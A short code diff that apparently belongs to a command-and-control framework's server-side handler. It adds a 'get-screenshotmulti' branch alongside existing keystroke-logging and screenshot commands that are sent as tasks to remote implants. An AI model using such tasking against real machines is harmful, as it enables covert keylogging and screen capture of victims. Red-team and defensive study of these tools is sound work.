@@ -586,6 +586,9 @@ def runcommand(command, randomuri):
       elif (command.lower().startswith("get-keystrokes")):
         new_task("run-exe Core.Program Core %s" % command,randomuri)
 
+      elif (command.lower().startswith("get-screenshotmulti")):
+        new_task(command,randomuri)
+
       elif (command.lower().startswith("get-screenshot")):
         new_task("run-exe Core.Program Core %s" % command,randomuri)
         
